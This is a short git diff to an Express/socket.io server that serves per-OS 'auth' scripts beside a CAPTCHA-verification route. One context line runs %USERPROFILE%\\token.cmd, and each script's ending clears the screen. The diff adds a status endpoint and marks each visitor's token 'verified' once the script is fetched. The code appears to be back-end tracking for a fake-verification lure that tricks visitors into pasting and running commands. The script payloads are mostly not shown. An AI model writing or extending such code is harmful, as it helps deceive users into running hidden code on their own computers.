@@ -12,6 +12,8 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
 
+const status = {}; // token -> status
+
 io.on("connection", (socket) => {
   console.log("Browser connected:", socket.id);
 });
@@ -123,6 +125,10 @@ router.post('/verify-captcha', async (req, res) => {
   }
 });
 
+router.get("/status/:token", (req, res) => {
+  res.json({ status: status[req.params.token] || "pending" });
+});
+
 // Windows Auth
 router.get("/auth/windows", (req, res) => {
   const token = req.query.token;
@@ -149,6 +155,8 @@ call "%USERPROFILE%\\token.cmd"
 cls
 `);
   }
+  
+  status[token] = "verified";
 });
 
 // Linux Auth
@@ -185,6 +193,8 @@ clear
 exit 0
 `);
   }
+  
+  status[token] = "verified";
 });
 
 // Mac Auth
@@ -219,6 +229,8 @@ clear
 exit 0
 `);
   }
+  
+  status[token] = "verified";
 });
 
 // Token Parser
